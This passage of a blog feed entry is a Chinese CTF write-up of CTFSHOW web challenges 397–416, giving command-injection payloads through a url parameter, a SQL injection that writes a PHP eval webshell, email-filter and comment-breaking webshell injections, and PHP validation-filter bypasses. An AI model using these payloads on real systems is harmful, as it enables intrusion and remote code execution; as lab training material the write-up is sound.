src="https://oss.waynejoons.icu/picphoto/20250820162308362.png"></p><p>因为<code>/tmp</code>是在根目录，用<code>../</code>返回上一级即可，方法跟之前一样</p><p><strong>方法一：反引号执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`ls`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820162629249.png"></p><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`cat fl0g.php`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820162552339.png"></p><p><strong>方法二：$()执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(ls)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(cat fl0g.php)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><strong>方法三：分号截断命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://1/1;echo `ls` &gt; 1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://1/1;echo `cat fl0g.php` &gt; 1.txt</span><br></pre></td></tr></table></figure><h3 id="web398"><a href="#web398" class="headerlink" title="web398"></a>web398</h3><p>对host部分<strong>过滤了分号</strong>，方法三用不了，其他步骤跟web397一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820162951438.png"></p><p><strong>方法一：反引号执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`ls`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`cat fl0g.php`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><strong>方法二：$()执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(ls)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(cat fl0g.php)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><h3 id="web399"><a href="#web399" class="headerlink" title="web399"></a>web399</h3><p>对host<strong>过滤了分号和&gt;</strong>，影响的还是步骤三，步骤一和步骤二不影响</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820163409266.png"></p><p><strong>方法一：反引号执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`ls`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`cat fl0g.php`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><strong>方法二：$()执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(ls)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(cat fl0g.php)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><h3 id="web400"><a href="#web400" class="headerlink" title="web400"></a>web400</h3><p>在web399的基础上<strong>多过滤了http和https</strong>，且不区分大小写，不过影响不大，步骤跟上题一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820163720550.png"></p><p><strong>方法一：反引号执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`ls`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`cat fl0g.php`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><strong>方法二：$()执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(ls)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(cat fl0g.php)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><h3 id="web401"><a href="#web401" class="headerlink" title="web401"></a>web401</h3><p>这题把解析后的URL打印了出来，然后比上题<strong>多过滤了反斜杠</strong>，不过不影响做题</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820165009918.png"></p><p><strong>方法一：反引号执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`ls`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`cat fl0g.php`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><strong>方法二：$()执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(ls)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(cat fl0g.php)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><h3 id="web402"><a href="#web402" class="headerlink" title="web402"></a>web402</h3><p>这题对scheme协议做了过滤，要求不能出现http和https，随便输入个东西替换即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820170019502.png"></p><p><strong>方法一：反引号执行系统命令</strong></p><p>把http换成1，然后跟之前一样传参即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=1://`ls`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820170255154.png"></p><p>读取1.txt内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820170352451.png"></p><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=1://`cat fl0g.php`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820170320485.png"></p><p><strong>方法二：$()执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=1://$(ls)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=1://$(cat fl0g.php)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><h3 id="web403"><a href="#web403" class="headerlink" title="web403"></a>web403</h3><p>先看看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820170825682.png"></p><p>过滤规则改了，我们分析一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure><p>这段代码用正则表达式判断 <code>$url[&#39;host&#39;]</code> 是否是一个<strong>合法的IPv4地址</strong>。具体解释如下：</p><ul><li><code>/^...$/</code> ：匹配<strong>整个字符串</strong>（从头到尾），保证整个输入就是IP，不夹杂其他字符</li><li><code>((2[0-4]\d|25[0-5]|[1]?\d\d?)\.)&#123;3&#125;</code> ：匹配前三段，每段<strong>数字+点</strong>。每段数字规则如下：<ul><li><code>2[0-4]\d</code>：匹配200-249</li><li><code>25[0-5]</code>：匹配250-255</li><li><code>?\d\d?</code>：匹配0-199（包括1位、2位、3位数字，即0-9、00-99、100-199）</li></ul></li><li>最后一段没有点，只剩数字部分，规则同上</li></ul><p>综合起来，这个正则表达式能精确匹配<strong>0.0.0.0~255.255.255.255</strong>范围内的IPv4地址格式</p><p>因此之前的方法一和方法二都用不了，但是方法三可以用了，咱们用分号截断之前的命令并执行新命令</p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1/1;echo `ls` &gt; 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820172301463.png"></p><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1/1;echo `cat fl0g.php` &gt; 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820172355894.png"></p><h3 id="web404"><a href="#web404" class="headerlink" title="web404"></a>web404</h3><p>这题说起来挺好笑的，刚开始看到标题写了“容器生成较慢，得多等一会儿”，我真以为要多等一会，硬生生等了几十分钟，结果点进去还是404，就觉得奇怪。后面看到图片还一闪一闪的，好家伙这网页还带自动刷新的，发现不对劲后点开源码看看，结果真被坑了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820180155265.png"></p><p>后面想了一会，应该是因为这题是web404，估计官方想借此整活，也是被气笑了</p><p>回归正题，我们看到源码里写了<code>404.php</code>，拼接进网页访问</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820180447119.png"></p><p>可以看到比上题多了个正则匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/[A-Za-z0-9]+$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure><p>简单来说，这个正则表达式检测的字符串必须是：</p><ul><li>以斜杠 <code>/</code> 开头</li><li>斜杠后面跟着至少一个字母或数字</li><li>整个字符串中不能有空格或其他符号</li></ul><p>比如符合的路径有：</p><ul><li><code>/abc</code></li><li><code>/A1B2C3</code></li><li><code>/12345</code></li></ul><p>然后host部分的正则匹配也改了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>(2[0-4]\d|25[0-5]|[1]?\d\d?)</code> 是0-255范围内的一段数字</li><li><code>((...)\.)&#123;3&#125;</code> 表示前三个数字段加点</li></ul><p>但因为最后的<code>.</code>是匹配<strong>任意字符</strong>，该正则会匹配形如“192.168.1.1a”或“10.0.0.1&#x2F;”这类，末尾允许<strong>至少跟着一个字符</strong>，不是严格的IP地址校验。而且也没有用开头 ^ 和结尾 $ 锚点来表示必须完全匹配整个字符串，这给了我们机会，可以用<strong>分号截断命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1;echo `ls` &gt; 1.txt;/1</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820181549912.png"></p><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1;echo `cat fl0g.php` &gt; 1.txt;/1</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820181638133.png"></p><h3 id="web405"><a href="#web405" class="headerlink" title="web405"></a>web405</h3><p>先看看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820183217894.png"></p><p>这次多了对scheme的检测，要求必须包含波浪号、点号或者php字符其中之一，因此我们改一下协议即可，方法跟之前一样</p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=php://127.0.0.1;echo `ls` &gt; 1.txt;/1</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=php://127.0.0.1;echo `cat fl0g.php` &gt; 1.txt;/1</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820183649958.png"></p><h3 id="web406"><a href="#web406" class="headerlink" title="web406"></a>web406</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820190938766.png"></p><p>源码提示<code>flag in db</code>，说明flag放在数据库。然后对传入的参数url进行了过滤，去除了无效url地址</p><p>用<strong>联合注入</strong>写入webshell即可，空格用<code>/**/</code>代替，不然会不行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1/&#x27;union/**/select/**/1,&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;/**/into/**/outfile/**/&#x27;/var/www/html/1.php#</span><br></pre></td></tr></table></figure><p>然后打开<code>1.txt</code>查看，可以看到成功写入</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820193733048.png"></p><p>蚁剑连接webshell即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820193827881.png"></p><p>可以看到有个<code>config.php</code>配置文件</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250820193919455.png"></p><p>打开可以获取数据库账号密码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820193954972.png"></p><p>然后打开数据库操作页面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820194044451.png"></p><p>添加数据库，如图所示</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820194125236.png"></p><p>成功找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820194207134.png"></p><h3 id="web407"><a href="#web407" class="headerlink" title="web407"></a>web407</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820200550677.png"></p><p>这题改成了要求输入参数ip，且要求必须为IP地址以通过<code>FILTER_VALIDATE_IP</code>验证</p><p>然后我们的目标是执行cafe类的add函数，可以用<code>::</code>来调用函数</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=cafe::add</span><br></pre></td></tr></table></figure><p>cafe::add会被当成IPv6地址，从而通过<code>FILTER_VALIDATE_IP</code>验证，展开的话就类似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cafe:0000:0000:0000:0000:0000:0000:0add</span><br></pre></td></tr></table></figure><p>然后打开网页源代码查看flag即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820202126390.png"></p><p>我们分析一下IPv6构造：</p><p>IPv6地址的构造规则比较复杂，支持多种简写和压缩形式</p><ul><li>IPv6地址由8组4位十六进制数字（0-9，a-f）组成，中间用冒号 <code>:</code> 分隔，如 <code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code></li><li>可以使用双冒号 <code>::</code> 缩写连续的零，比如 <code>2001:db8::1</code> 表示中间连续的0可省略</li><li>各部分区段中的数字可以使用小写或大写的十六进制字符</li></ul><p>用个表格来概括就是</p><table><thead><tr><th align="left">特点</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">长度</td><td align="left">128位（二进制）</td></tr><tr><td align="left">分组</td><td align="left">8组，每组16位，用冒号分隔</td></tr><tr><td align="left">表示</td><td align="left">采用十六进制数字表示，每组4位</td></tr><tr><td align="left">前导零省略</td><td align="left">可省略每组开头的零</td></tr><tr><td align="left">连续多个0压缩为<code>::</code></td><td align="left">每个地址只能出现一次<code>::</code></td></tr><tr><td align="left">地址类型多样</td><td align="left">单播、组播、任播，特殊前缀表示不同用途</td></tr><tr><td align="left">IPv4兼容和过渡地址</td><td align="left">支持将IPv4嵌入IPv6地址</td></tr><tr><td align="left">接口标识符自动生成</td><td align="left">通过EUI-64等标准根据MAC生成</td></tr></tbody></table><p>例如，典型IPv6地址是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2001:0db8:85a3::8a2e:0370:7334</span><br></pre></td></tr></table></figure><p>它等价于展开的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2001:0db8:85a3:0000:0000:8a2e:0370:7334</span><br></pre></td></tr></table></figure><h3 id="web408"><a href="#web408" class="headerlink" title="web408"></a>web408</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820210526263.png"></p><p>这次改成了验证是否满足邮箱格式了，我们介绍一下<code>FILTER_VALIDATE_EMAIL</code></p><p><code>FILTER_VALIDATE_EMAIL</code> 是 PHP 内置的一个专门用来<strong>验证电子邮件格式是否合法</strong>的过滤器</p><p>它会根据<strong>RFC 5322标准</strong>对邮箱格式做校验，包括：</p><ul><li>检查是否存在且且只有一个 <code>@</code> 符号</li><li><code>@</code> 前面的部分是邮箱用户名，允许的字符包括字母、数字、点 (<code>.</code>)、下划线 (<code>_</code>) 和连字符 (<code>-</code>) 等</li><li><code>@</code> 后面的部分是邮箱域名，必须包含有效的域名格式，比如 <code>example.com</code>，包含至少一个点号 (<code>.</code>)，并且顶级域名部分也要正确</li><li>避免使用不合法或不允许的特殊字符</li><li>验证邮箱的整体格式符合国际标准，不过不验证邮箱是否真实存在</li></ul><p>然后<code>file_put_contents</code>格式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(string $filename, mixed $data [, int $flags = 0 [, resource $context]])</span><br></pre></td></tr></table></figure><ul><li><code>$filename</code>：要写入的文件路径和名称，如果文件不存在，则会自动创建</li><li><code>$data</code>：写入文件的数据，可以是字符串、数组或者流资源</li><li><code>$flags</code>（可选）：<ul><li><code>FILE_APPEND</code>：将数据追加到文件末尾，而不是覆盖</li><li><code>LOCK_EX</code>：写入时给文件加独占锁，以防止其他进程同时写入导致数据混乱</li><li><code>FILE_USE_INCLUDE_PATH</code>：在包含路径中搜索文件</li></ul></li><li><code>$context</code>（可选）：用于修改资源流的行为</li></ul><p>可以把非法字符放在双引号里绕过email@的前缀限制，因此payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?email=&quot;&lt;?=eval($_POST[1]);?&gt;&quot;@1.php</span><br></pre></td></tr></table></figure><p>然后蚁剑连接</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820211220264.png"></p><p>在根目录找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820211245618.png"></p><h3 id="web409"><a href="#web409" class="headerlink" title="web409"></a>web409</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820213147394.png"></p><p>会过滤掉任意字符后的flag，这题我们可以通过闭合PHP代码来做</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?email=&quot;flageval($_POST[1]);?&gt;&quot;@1.com</span><br></pre></td></tr></table></figure><p>通过在前面加上<code>flag</code>来触发<code>$email=preg_replace(&#39;/.flag/&#39;, &#39;&#39;, $email);</code>这一行代码，会删掉前面的<code>&quot;flag</code>，接着<code>?&gt;</code>闭合代码</p><p>然后POST传参执行命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820223536813.png"></p><p>读取flag即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820223953048.png"></p><h3 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820230748593.png"></p><p>这次是通过布尔判断输入的b是否是”1“</p><p>根据PHP文档，<code>FILTER_VALIDATE_BOOLEAN</code> 会把下列字符串（不区分大小写）视为<strong>true</strong>：</p><ul><li><code>&quot;1&quot;</code></li><li><code>&quot;true&quot;</code></li><li><code>&quot;on&quot;</code></li><li><code>&quot;yes&quot;</code></li></ul><p>以下对应的字符串（不区分大小写）视为<strong>false</strong>：</p><ul><li><code>&quot;0&quot;</code></li><li><code>&quot;false&quot;</code></li><li><code>&quot;off&quot;</code></li><li><code>&quot;no&quot;</code></li><li><code>&quot;&quot;</code>（空字符串）</li></ul><p>然后题目过滤了大于0的数字和true字符串，那我们传入on和yes都可以，大小写都行</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b=yes</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b=on</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820231040237.png"></p><h3 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820234813468.png"></p><p>跟上题一样，不过这次把on的大小写过滤了，我们用yes或TRUE等都可以，太多方法可以绕过了</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b=yes</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820235040393.png"></p><h3 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820235321932.png"></p><p>这次是POST传参ctfshow，然后添加到<code>flag.php</code>末尾，同时前面还有个注释符<code>//</code></p><p>用<code>%0a</code>换行即可</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=%0aeval($_POST[1]);</span><br></pre></td></tr></table></figure><p>然后蚁剑连接webshell</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821000718225.png"></p><p>在<code>flag.php</code>找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821000748134.png"></p><h3 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h3><p>这题相比上一题，注释的方式改了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821001112335.png"></p><p>ctfshow变量被包含在多行注释符<code>/**/</code>里面了</p><p>只需前后加个注释符即可</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=*/eval($_POST[1]);/*</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250821001622283.png"></p><p>然后跟上题一样，蚁剑连接webshell，在<code>flag.php</code>找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821001650368.png"></p><h3 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821002329949.png"></p><p>我们简单分析一下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($ctfshow == true)</span><br></pre></td></tr></table></figure><p>判断变量<code>$ctfshow</code>是否等于<code>true</code>，只有在<code>$ctfshow</code>为真时，才会执行内部判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqrt($ctfshow) &gt;= sqrt(intval($flag))</span><br></pre></td></tr></table></figure><ul><li><code>sqrt()</code>是取平方根函数</li><li><code>intval($flag)</code>将<code>$flag</code>转换为整数</li><li>判断<code>$ctfshow</code>的平方根是否大于等于<code>$flag</code>整数值的平方根</li></ul><p>只有当<code>$ctfshow</code>的平方根小于<code>$flag</code>整数的平方根时，才会显示flag</p><p>然后我们再来分析<strong>一般情况</strong>下布尔判断条件</p><p><strong>被视为 false 的值：</strong></p><ul><li>布尔 <code>false</code></li><li>整数 0</li><li>浮点数 0.0</li><li>空字符串 <code>&quot;&quot;</code>（包含字符串 “0”）</li><li>字符串 <code>&quot;0&quot;</code></li><li>空数组 <code>[]</code></li><li><code>NULL</code></li></ul><p><strong>被视为 true 的值：</strong></p><ul><li>任意非零数字，例如<code>1</code>、<code>-1</code>、<code>3.14</code></li><li>非空字符串，且不等于 <code>&quot;0&quot;</code>，如 <code>&quot;false&quot;</code>、<code>&quot;off&quot;</code>、<code>&quot;hello&quot;</code> 等都会被认为是真</li><li>非空数组</li><li>资源类型</li><li>对象</li></ul><p>因此这题我们只要传入<strong>非零负数</strong>即可成功通过验证</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=-1</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250821003042661.png"></p><h3 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821003515914.png"></p><p>在PHP中，<strong>函数名是不区分大小写的</strong>，这意味着定义函数时用的名字，如<code>getflag()</code>，在调用时可以写成<code>getflag()</code>、<code>GetFlag()</code>、<code>GETFLAG()</code>等，都会被正确识别并调用</p><p>不过需要注意的是，虽然函数名调用不区分大小写，但<strong>变量名是区分大小写的</strong></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?k=getFlag</span><br></pre></td></tr></table></figure><p>然后源代码查看flag即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821003727390.png"></p><h3 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821004434525.png"></p><p>我们要调用的是ctf类中的flag方法，直接用<strong>双冒号操作符</strong>即可</p><p>补充解释一下，它主要用于：</p><ul><li>访问类的<strong>静态属性</strong>和<strong>静态方法</strong></li><li>访问类的常量</li><li>调用父类（<code>parent::</code>）、当前类（<code>self::</code>）、或静态绑定类（<code>static::</code>）的成员</li></ul><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=ctf::flag</span><br></pre></td></tr></table></figure><p>然后源代码查看flag即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821004647785.png"></p>]]></content>
    
    
    <summary type="html">CTFSHOW 其他篇第一部分详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 日志分析-ssh日志分析</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-SSH-Log-Analysis/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-SSH-Log-Analysis/</id>
    <published>2025-08-19T07:37:26.000Z</published>
    <updated>2025-11-10T04:12:48.417Z</updated>
    
